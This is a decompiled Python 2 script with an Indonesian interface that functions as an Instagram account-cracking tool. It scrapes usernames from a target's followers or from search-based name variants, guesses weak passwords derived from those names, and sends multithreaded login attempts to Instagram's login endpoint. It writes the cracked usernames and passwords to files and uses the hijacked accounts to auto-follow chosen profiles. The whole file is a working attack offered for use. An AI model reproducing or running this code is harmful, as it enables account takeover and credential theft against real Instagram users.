# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-01-17 22:14:42.018460
a = '\x1b[96;1m'
p = '\x1b[97;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
m = '\x1b[91;1m'
d = '\x1b[90;1m'
import os
try:
    import concurrent.futures
except ImportError:
    print k + '\n Modul Futures blom terinstall!...'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')
try:
    import requests
except ImportError:
    print k + '\n Modul Requests blom terinstall!...'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
import os, requests, re, json, random, sys, platform, base64, datetime, subprocess, uuid, time
from calendar import monthrange
from concurrent.futures import ThreadPoolExecutor
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def lisensi():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print ' License Invalid !'
        os.system('clear')
        os.system('rm -rf licensed.log')
        lisen()
    if os.path.exists('licensed.log'):
        user1()
    else:
        lisen()
def lisen():
    os.system('clear')
    print baner
    jalan(' Mohon Tunggu ...')
    time.sleep(0.5)
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    jalan('\n Lisensi : ' + id)
    time.sleep(0.05)
    jalan(' Lisensi Belum Di Konfirmasi')
    time.sleep(0.05)
    jalan(' Chat Admin Untuk Mengkonfirmasi Lisensi')
    time.sleep(0.05)
    os.sys.exit()
def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/RTXD22/lisensi_ig/blob/main/lisensi').text.strip()
        if j in r:
            os.system('clear')
            print baner
            jalan(' Sedang Memeriksa Lisensi')
            time.sleep(2)
            jalan('\n Lisensi Tersedia ')
            time.sleep(0.5)
            menu()
        else:
            os.system('clear')
            print baner
            jalan(' Sedang Memeriksa Lisensi')
            time.sleep(2)
            jalan(' Lisensi Tidak Tersedia !')
            time.sleep(1)
            lisen()
            jalan(' Chat Admin Untuk Mengkonfirmasi Lisensi')
            time.sleep(0.05)
            os.sys.exit()
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print ' Tidak Ada Koneksi.'
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        cek_login()
garis = p + '________________________________'
data_ = []
hasil_ok = []
hasil_cp = []
c = 1
status_foll = []
data_followers = []
pencarian_ = []
platform_dev = str(platform.platform()).lower()
p1 = base64.b64encode(platform_dev)
try:
    has_ok = open('hasil_ok.txt', 'r').readlines()
    with open('hasil_ok.txt', 'w') as (tul):
        tul.write('')
    for dev in set(has_ok):
        with open('hasil_ok.txt', 'a') as (tu):
            tu.write(dev)
except:
    pass
try:
    has_cp = open('hasil_cp.txt', 'r').readlines()
    with open('hasil_cp.txt', 'w') as (tul):
        tul.write('')
    for dev in set(has_cp):
        with open('hasil_cp.txt', 'a') as (tu):
            tu.write(dev)
except:
    pass
url_instagram = 'https://www.instagram.com/'
user_agentz = 'ua'
user_agentz_api = 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)'
user_agentz_qu = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0', 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)']
headerz = {'User-Agent': user_agentz}
headerz_api = {'User-Agent': user_agentz_api}
def hapus_cookie():
    try:
        os.system('del cookie.txt' if os.name == 'nt' else 'rm -f cookie.txt')
    except:
        pass
def hapus_cokiz():
    try:
        os.system('del cokiz.txt' if os.name == 'nt' else 'rm -f cokiz.txt')
    except:
        pass
def cek_hasil():
    print p + '\n 1.) Cek Hasil ' + h + 'OK'
    print p + ' 2.) Cek Hasil ' + k + 'CP'
    while True:
        pil = raw_input(p + '\n Pilih : ')
        print garis
        if pil == '1':
            try:
                hasil_ok_ = open('hasil_ok.txt', 'r').readlines()
                print p + '\n Menampilkan Hasil ' + h + 'OK\n'
                for dev in hasil_ok_:
                    ok = dev.replace('\n', '').split('==>')
                    print h + ' [OK] ' + h + ok[1] + p + ' | ' + h + ok[3]
                print p + '\n Jumlah : ' + str(len(hasil_ok_))
                raw_input(p + '\n Enter ')
                menu()
            except:
                print p + '\n Belum ada hasil' + h + ' OK'
                raw_input(p + '\n Enter ')
                menu()
            break
        elif pil == '2':
            try:
                hasil_cp_ = open('hasil_cp.txt', 'r').readlines()
                print p + '\n Menampilkan Hasil ' + k + 'CP\n'
                for dev in hasil_cp_:
                    cp = dev.replace('\n', '').split('==>')
                    print k + ' [CP] ' + k + cp[1] + p + ' | ' + k + cp[3]
                print p + '\n Jumlah : ' + str(len(hasil_cp_))
                raw_input(p + ' Enter ')
                menu()
            except:
                print p + '\n Belum ada hasil' + k + ' CP'
                raw_input(p + ' Enter ')
                menu()
            break
def cek_login():
    global cookie
    try:
        cok = open('cookie.txt', 'r').read()
    except IOError:
        login_dev()
    else:
        url = 'https://i.instagram.com/api/v1/friendships/49508398125/followers/?count=5'
        with requests.Session() as (ses_dev):
            try:
                login_coki = ses_dev.get(url, cookies={'cookie': cok}, headers=headerz_api)
                if 'users' in json.loads(login_coki.content):
                    cookie = {'cookie': cok}
                else:
                    print m + '\n Cookie Kadaluarsa.\n'
                    hapus_cookie()
                    login_dev()
            except ValueError:
                print m + '\n Cookie Kadaluarsa.\n'
                hapus_cookie()
                login_dev()
def login_dev_cookie():
    global cookie
    os.system('clear')
    print baner
    print '\n Login Instagram\n'
    cok = raw_input(' Masukkan Cookie: ')
    with requests.Session() as (ses_dev):
        login_coki = ses_dev.get(url_instagram, cookies={'cookie': cok}, headers=headerz)
        if 'viewer_has_liked' in str(login_coki.content):
            print ' Login Sukses.'
            with open('cookie.txt', 'w') as (tulis_coki):
                tulis_coki.write(cok)
                cookie = {'cookie': cok}
        else:
            print ' Login Gagal.'
            exit()
def data_pencarian_dev(cookie, nama, limit):
    url = ('https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true').format(limit, nama)
    with requests.Session() as (ses_dev):
        res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
        for dev in json.loads(res_dat_pencarian.content)['users']:
            users = dev['user']
            print ' Username:', users['username']
            print ' Nama:', users['full_name'].encode('utf-8')
            print '-' * 50
def crack():
    with ThreadPoolExecutor(max_workers=30) as (insta_dev):
        for dataku in data_:
            try:
                pw = []
                data = dataku.encode('utf-8')
                dat_ = data.split('==>')[0]
                pw_ = data.split('==>')[1]
                pw_nam = pw_.split()
                if len(pencarian_) != 1:
                    if len(dat_) >= 6:
                        pw.append(dat_)
                        if len(pw_nam[0]) <= 2:
                            if len(pw_nam) >= 2:
                                pw.append(pw_nam[0] + pw_nam[1])
                            if len(pw_) >= 6:
                                pw.append(pw_)
                        else:
                            pw.append(pw_nam[0] + '123')
                            if len(pw_nam) >= 2:
                                pw.append(pw_nam[0] + pw_nam[1])
                            if len(pw_) >= 6:
                                pw.append(pw_)
                    elif len(pw_nam[0]) <= 2:
                        if len(pw_nam) >= 2:
                            pw.append(pw_nam[0] + pw_nam[1])
                        if len(pw_) >= 6:
                            pw.append(pw_)
                    else:
                        if len(pw_nam) >= 2:
                            pw.append(pw_nam[0] + pw_nam[1])
                        pw.append(pw_nam[0] + '123')
                        if len(pw_) >= 6:
                            pw.append(pw_)
                else:
                    pw.append(pw_nam[0] + '123')
                    pw.append(dat_)
                insta_dev.submit(crack_dev, dat_, pw)
            except:
                pass
def auto_follow():
    data_ok = open('hasil_ok.txt', 'r').readlines()
    for dev in data_ok:
        pecah = dev.split('==>')[1]
        if pecah not in data_followers:
            print ('\r >- Yang Belum Mengikuti: {}').format(len(data_)),
            sys.stdout.flush()
            data_.append(dev)
    print '\n'
    with ThreadPoolExecutor(max_workers=3) as (insta_foll):
        for data_foll in data_:
            data_foll_ = data_foll.replace('\n', '')
            us_foll = data_foll_.split('==>')[1]
            pw_foll = data_foll_.split('==>')[3]
            insta_foll.submit(crack_dev, us_foll, pw_foll)
c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
    global c_foll
    global count_foll
    if len(status_foll) != 1:
        user_target = 'triagss'
        id_target = '49508398125'
    else:
        print h + ('\r >>> Follow {}/{}|Chek+{}/Live+{}  ').format(str(count_foll), len(data_), len(hasil_cp), len(hasil_ok)),
        sys.stdout.flush()
        user_target = username_get_follow
        id_target = id_
    dat_crf_foll = ses_dev.get(('https://www.instagram.com/{}/').format(user_target), headers=headerz_api).content
    crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
    headerz_foll = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'en-US,en;q=0.5', 
       'Host': 'www.instagram.com', 
       'Origin': 'https://www.instagram.com', 
       'Referer': ('https://www.instagram.com/{}/').format(user_target), 
       'User-Agent': user_agentz, 
       'X-CSRFToken': crf_token_foll}
    param_foll = {''}
    url_follow = ('https://www.instagram.com/web/friendships/{}/follow/').format(id_target)
    res_foll = ses_dev.post(url_follow, headers=headerz_foll)
    if len(status_foll) != 1:
        pass
    else:
        print h + '\r [' + k + '>-' + h + '] ' + p + str(c_foll) + ' ' + k + username_dev + h + ' Sukses Mengikuti ' + p + user_target + k + ' >_< Wkwwkwkw\n'
        c_foll += 1
        count_foll += 1
None
def login_dev():
    global cookie
    os.system('clear')
    print baner
    print p + ' Login Instagram '
    print garis
    username_dev = raw_input(p + '\n Masukkan Username : ')
    pass_dev = raw_input(p + ' Masukkan  Sandi : ')
    try:
        try:
            headerz = {'User-Agent': user_agentz}
            with requests.Session() as (dev):
                url_scrap = 'https://www.instagram.com/'
                data = dev.get(url_scrap, headers=headerz).content
                crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
               'Accept-Language': 'en-US,en;q=0.5', 
               'Host': 'www.instagram.com', 
               'X-CSRFToken': crf_token, 
               'X-Requested-With': 'XMLHttpRequest', 
               'Referer': 'https://www.instagram.com/accounts/login/', 
               'User-Agent': user_agentz}
            param = {'username': username_dev, 
               'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 9999999999), pass_dev), 
               'optIntoOneTap': False, 
               'queryParams': {}, 'stopDeletionNonce': '', 
               'trustedDeviceRecords': {}}
        except:
            header = {}
            param = {}
        with requests.Session() as (ses_dev):
            url = 'https://www.instagram.com/accounts/login/ajax/'
            respon = ses_dev.post(url, data=param, headers=header)
            data_dev = json.loads(respon.content)
            da = respon.cookies.get_dict()
            if 'userId' in str(data_dev):
                print p + '\n Login Sukses.'
                for dev in da:
                    with open('cookie.txt', 'a') as (tulis):
                        tulis.write(dev + '=' + da[dev] + ';')
                follow_dev(ses_dev, username_dev)
                cok = open('cookie.txt', 'r').read()
                cookie = {'cookie': cok}
            elif 'checkpoint_url' in str(data_dev):
                print p + '\n Akun Cp.'
            elif 'Please wait' in str(data_dev):
                print p + ' Mode Pesawat. >'
            else:
                print p + '\n Login Gagal.'
                exit()
    except KeyboardInterrupt:
        exit()
None
def data_follower_dev(cookie, id_target, limit, opsi):
    global c
    if opsi == '1':
        url = ('https://i.instagram.com/api/v1/friendships/{}/followers/?count={}').format(id_target, limit)
    elif opsi == '2':
        url = ('https://i.instagram.com/api/v1/friendships/{}/following/?count={}').format(id_target, limit)
    else:
        exit(' Error.')
    with requests.Session() as (ses_dev):
        res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
        for dev in json.loads(res_dat_foll.content)['users']:
            username = dev['username']
            nama = dev['full_name'].encode('utf-8')
            if len(status_foll) != 1:
                print p + ('\r Mengambil Username : {}').format(len(data_)),
                sys.stdout.flush()
                data_.append(username + '==>' + nama.decode('utf-8'))
                c += 1
            else:
                data_followers.append(username)
None
def info_dev(username_dev, pass_dev, status):
    global id_
    global mengikuti
    global pengikut
    try:
        da = requests.get(('https://www.instagram.com/{}/?__a=1').format(username_dev), headers={'User-Agent': user_agentz})
        data_us_dev = da.json()['graphql']['user']
        nama = data_us_dev['full_name'].encode('utf-8')
        id_ = data_us_dev['id']
        pengikut = data_us_dev['edge_followed_by']['count']
        mengikuti = data_us_dev['edge_follow']['count']
        if status == 'Live':
            print h + '\r Status: ' + h + status + '                 '
            print h + '\r Nama: ' + h + str(nama) + '              '
            print h + '\r Pengikut: ' + k + str(pengikut) + '              '
            print h + '\r Mengikuti: ' + k + str(mengikuti) + '              '
            print h + '\r Username: ' + h + username_dev + '              '
            print h + '\r Password: ' + h + pass_dev + '             \n'
        elif status == 'Checkpoint':
            print k + '\r Status: ' + k + status + '                 '
            print k + '\r Nama: ' + k + str(nama) + '              '
            print k + '\r Pengikut: ' + p + str(pengikut) + '              '
            print k + '\r Mengikuti: ' + p + str(mengikuti) + '              '
            print k + '\r Username: ' + k + username_dev + '              '
            print k + '\r Password: ' + k + pass_dev + '             \n'
    except:
        pass
None
count_ = 1
def crack_dev(username_dev, pass_dev_):
    global c
    global count_
    c_pw = len(pass_dev_)
    for pass_satu in pass_dev_:
        if c != 1:
            pass
        else:
            if len(status_foll) != 1:
                print p + ('\r Crack {}/{}\x1b[97;1m | \x1b[93;1mCP : {}\x1b[97;1m/\x1b[92;1mOK : {}  ').format(str(count_), len(data_), len(hasil_cp), len(hasil_ok)),
                sys.stdout.flush()
                c_pw -= 1
            try:
                if username_dev in hasil_ok or username_dev in hasil_cp:
                    break
                pass_dev = pass_satu.lower()
                try:
                    headerz = {'User-Agent': user_agentz_api}
                    with requests.Session() as (dev):
                        url_scrap = 'https://www.instagram.com/'
                        data = dev.get(url_scrap, headers=headerz).content
                        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                    header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
                       'Accept-Language': 'en-US,en;q=0.5', 
                       'Host': 'www.instagram.com', 
                       'X-CSRFToken': crf_token, 
                       'X-Requested-With': 'XMLHttpRequest', 
                       'Referer': 'https://www.instagram.com/accounts/login/', 
                       'User-Agent': user_agentz}
                    param = {'username': username_dev, 
                       'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 99999999999), pass_dev), 
                       'optIntoOneTap': False, 
                       'queryParams': {}, 'stopDeletionNonce': '', 
                       'trustedDeviceRecords': {}}
                except:
                    header = {}
                    param = {}
                with requests.Session() as (ses_dev):
                    url = 'https://www.instagram.com/accounts/login/ajax/'
                    respon = ses_dev.post(url, data=param, headers=header)
                    data_dev = json.loads(respon.content)
                    time.sleep(0.1)
                    if 'checkpoint_url' in str(data_dev):
                        cp = 'Checkpoint'
                        info_dev(username_dev, pass_dev, cp)
                        with open('hasil_cp.txt', 'a') as (dev_):
                            dev_.write('[Chek]==>' + username_dev + '==>|==>' + pass_dev + '\n')
                        hasil_cp.append(username_dev)
                        break
                    elif 'userId' in str(data_dev):
                        live = 'Live'
                        if len(status_foll) != 1:
                            info_dev(username_dev, pass_dev, live)
                            with open('hasil_ok.txt', 'a') as (dev_):
                                dev_.write('[Live]==>' + username_dev + '==>|==>' + pass_dev + '\n')
                            hasil_ok.append(username_dev)
                            follow_dev(ses_dev, username_dev)
                        else:
                            hasil_ok.append('dev_id')
                            follow_dev(ses_dev, username_dev)
                        break
                    elif 'Please wait' in str(data_dev):
                        print p + '\r Mode Pesawat. >' + p + (' {}').format(str(c)),
                        c += 1
                        sys.stdout.flush()
                        pass_dev_iq = [pass_dev]
                        crack_dev(username_dev, pass_dev_iq)
                        count_ -= 1
                    else:
                        c = 1
            except requests.exceptions.ConnectionError:
                print p + ('\r Tidak ada koneksi Internet. > {}').format(str(c)),
                sys.stdout.flush()
                c += 1
                pass_dev_iq = [pass_dev]
                crack_dev(username_dev, pass_dev_iq)
                count_ -= 1
            except:
                c = 1
    count_ += 1
None
def _yuk_(iqbaldev):
    import string
    try:
        open('cokiz.txt', 'r').read()
    except IOError:
        d_str = []
        fu = base64.b64encode(iqbaldev + 'O')
        for str_ in str(string.ascii_lowercase):
            d_str.append(str_)
        for i_ in fu:
            with open('cokiz.txt', 'a') as (iq):
                iq.write(i_ + random.choice(d_str) + '%')
def _uyuk_():
    global followerz
    global followerzz
    global wak_
    try:
        fol_tam = ''
        fol_tamzz = ''
        fol_z = open('cokiz.txt', 'r').read().split('%>')
        for dev_fol in fol_z[0].split('%'):
            try:
                fol_tam += dev_fol[0]
            except:
                pass
        followerz = base64.b64decode(fol_tam)
        if platform_dev != base64.b64decode(fol_z[2]):
            pass
        else:
            try:
                for dev_folzz in fol_z[1].split('%'):
                    try:
                        fol_tamzz += dev_folzz[0]
                    except:
                        pass
                followerzz = base64.b32decode(fol_tamzz)
            except:
                pass
            try:
                wak_ = base64.b64decode(fol_z[3]).split()
            except:
                pass
    except:
        pass
def pilihan(pil):
    global username_get_follow
    proses_crack = p + ' Sedang Proses Crack.'
    if pil == '1':
        pas = ''
        status = ''
        username = raw_input(p + '\n Masukkan Username : ')
        info_dev(username, pas, status)
        print p + '\n 1.) Pengikut ' + username + ' : ' + p + str(pengikut)
        print p + ' 2.) Yang Diikuti ' + username + ' : ' + p + str(mengikuti)
        pil2 = raw_input(p + '\n Pilih : ')
        print garis
        limit = input(p + '\n Masukkan Jumlah : ')
        if pil2 == '1':
            data_follower_dev(cookie, id_, limit, pil2)
            print
            print proses_crack
            print '\n'
            crack()
        elif pil2 == '2':
            data_follower_dev(cookie, id_, limit, pil2)
            print
            print proses_crack
            print '\n'
            crack()
    elif pil == '2':
        usr_ = raw_input(p + '\n Masukkan Nama : ')
        jm = input(p + ' Masukkan Limit : ')
        us = usr_.replace(' ', '')
        pencarian_.append('iqbal_dev')
        data_.append(us + '==>' + us)
        data_.append(us + '_' + '==>' + us)
        for dev in range(1, jm + 1):
            data_.append(us + str(dev) + '==>' + us)
            data_.append(us + '_' + str(dev) + '==>' + us)
            data_.append(us + str(dev) + '_' + '==>' + us)
        print ''
        print proses_crack
        print '\n'
        crack()
    elif pil == '':
        data_follower_dev(cookie, id_, limit, pil2)
        print
        print proses_crack
        print '\n'
        crack()
    elif pil == '3':
        cek_hasil()
    elif pil == '':
        pas = ''
        status = ''
        status_foll.append('IqbalDev')
        username_get_follow = raw_input(p + '\n Masukkan Username Akunmu : ')
        info_dev(username_get_follow, pas, status)
        print garis
        print p + '\n 1.) Pengikut ' + username_get_follow + ' : ' + p + str(pengikut)
        print p + ' 2.) Yang Diikuti ' + username_get_follow + ' : ' + p + str(mengikuti)
        raw_input('\n Enter ')
        print garis
        data_follower_dev(cookie, id_, limit=1000000000, opsi='1')
        auto_follow()
    elif pil == '':
        import os
        try:
            os.system('git clone https://github.com/RTXD22/ig')
            os.system('rm -rf igeh.py')
            os.system('cp -f ig/igeh.py \\.')
            os.system('rm -rf ig')
            print p + '\n Berhasil Update Tool.'
        except:
            print '\n Hp Tidak Suport.'
    elif pil == '0':
        hapus_cookie()
        print '\n Keluar.'
def menu():
    os.system('clear')
    print baner
    print p + ' 1.) Crack Dari Followers.'
    print p + ' 2.) Crack Dari Pencarian.'
    print p + ' 3.) Cek Hasil.'
    print p + ' 0.) Log Out.'
    pil = raw_input('\n Pilih : ')
    print garis
    pilihan(pil)
_uyuk_()
baner = '\n  __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ \n |Github : https://github.com/RTXD22          |\n |__ __ __ __ __ __ __ __ __ __ __ __ __ __ __\n \n          DOSA TANGGUNG SENDIRI ANJINC        \n _____________________________________________\n\t'
if __name__ == '__main__':
    cek_login()
    menu()
# Mau Ngapain Cuk?